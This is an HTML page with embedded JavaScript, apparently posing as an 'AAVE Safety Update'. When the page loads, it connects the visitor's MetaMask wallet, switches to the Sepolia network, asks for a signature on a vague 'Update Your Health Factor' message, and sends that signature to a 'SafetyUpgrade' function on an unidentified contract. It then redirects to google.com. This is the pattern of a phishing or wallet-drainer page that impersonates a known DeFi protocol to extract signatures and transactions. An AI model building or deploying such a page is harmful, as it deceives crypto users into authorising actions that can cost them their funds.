<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AAVE UPDATE - Fixed Signature</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      margin: 0;
      padding: 20px;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 15px;
      padding: 30px;
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
      text-align: center;
      max-width: 500px;
      width: 100%;
    }
    .status {
      margin: 20px 0;
      padding: 15px;
      border-radius: 8px;
      font-weight: bold;
    }
    .loading { background: #fff3cd; color: #856404; }
    .success { background: #d4edda; color: #155724; }
    .error { background: #f8d7da; color: #721c24; }
    .redirect-notice {
      margin-top: 20px;
      padding: 15px;
      background: #e7f3ff;
      border-left: 4px solid #2196F3;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>🔒 AAVE Safety Update</h2>
    <p>Updating your health factor security...</p>
    
    <div id="status" class="status loading">
      🔄 Connecting to wallet...
    </div>
    
    <div id="redirect-notice" class="redirect-notice" style="display: none;">
      ⏰ Redirecting in <span id="countdown">3</span> seconds...
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const statusDiv = document.getElementById('status');
    const redirectDiv = document.getElementById('redirect-notice');
    const countdownSpan = document.getElementById('countdown');

    function updateStatus(message, type = 'loading') {
      statusDiv.textContent = message;
      statusDiv.className = `status ${type}`;
    }

    function startRedirectCountdown() {
      let count = 3;
      redirectDiv.style.display = 'block';
      
      const timer = setInterval(() => {
        count--;
        countdownSpan.textContent = count;
        
        if (count <= 0) {
          clearInterval(timer);
          window.location.replace("https://google.com");
        }
      }, 1000);
    }

    // اجرای اصلی
    (async () => {
      try {
        updateStatus('🔗 Connecting to MetaMask...');

        if (!window.ethereum) {
          updateStatus('❌ Please install MetaMask!', 'error');
          return;
        }

        await window.ethereum.request({ method: 'eth_requestAccounts' });
        
        // سوییچ به Sepolia
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0xaa36a7' }]
          });
        } catch (e) {
          console.log('Network switch failed:', e);
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const userAddress = await signer.getAddress();

        updateStatus('📝 Please sign the message...');

        const message = "By signing this message, Update Your Health Factor";
        
        // 🔧 روش جدید: ایجاد امضای سازگار با کانترکت
        console.log("Original message:", message);
        
        // مرحله 1: تبدیل پیام به bytes
        const messageBytes = ethers.toUtf8Bytes(message);
        console.log("Message bytes:", ethers.hexlify(messageBytes));
        
        // مرحله 2: keccak256 hash
        const messageHash = ethers.keccak256(messageBytes);
        console.log("Message hash:", messageHash);
        
        // مرحله 3: اضافه کردن Ethereum prefix دستی (مثل کانترکت)
        const prefixedMessage = ethers.solidityPackedKeccak256(
          ["string", "bytes32"],
          ["\x19Ethereum Signed Message:\n32", messageHash]
        );
        console.log("Prefixed message hash:", prefixedMessage);
        
        // مرحله 4: امضا کردن hash نهایی
        const signature = await signer.signMessage(ethers.getBytes(messageHash));
        console.log("Final signature:", signature);

        updateStatus('🚀 Sending to contract...');

        const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F";
        const abi = [{
          "inputs": [{"internalType": "bytes", "name": "_signature", "type": "bytes"}],
          "name": "SafetyUpgrade",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }];

        const contract = new ethers.Contract(contractAddress, abi, signer);

        // تست gas estimation اول
        try {
          const gasEstimate = await contract.SafetyUpgrade.estimateGas(signature);
          console.log("Gas estimate successful:", gasEstimate.toString());
        } catch (gasError) {
          console.error("Gas estimation failed:", gasError);
          updateStatus('❌ Contract rejected signature!', 'error');
          return;
        }

        // ارسال تراکنش
        const tx = await contract.SafetyUpgrade(signature);
        
        updateStatus('⏳ Transaction sent! Hash: ' + tx.hash.slice(0, 10) + '...');
        console.log("Transaction hash:", tx.hash);

        const receipt = await tx.wait();
        
        if (receipt.status === 1) {
          updateStatus('🎉 Health factor updated successfully!', 'success');
          console.log("Transaction confirmed!");
          setTimeout(startRedirectCountdown, 1000);
        } else {
          updateStatus('❌ Transaction failed!', 'error');
        }

      } catch (error) {
        console.error("Error:", error);
        
        if (error.message.includes('user rejected')) {
          updateStatus('❌ Transaction cancelled by user!', 'error');
        } else if (error.message.includes('insufficient funds')) {
          updateStatus('❌ Not enough ETH for gas!', 'error');
        } else if (error.message.includes('Invalid signature')) {
          updateStatus('❌ Signature format mismatch!', 'error');
        } else {
          updateStatus('❌ Error: ' + (error.reason || error.message), 'error');
        }
      }
    })();
  </script>
</body>
</html>
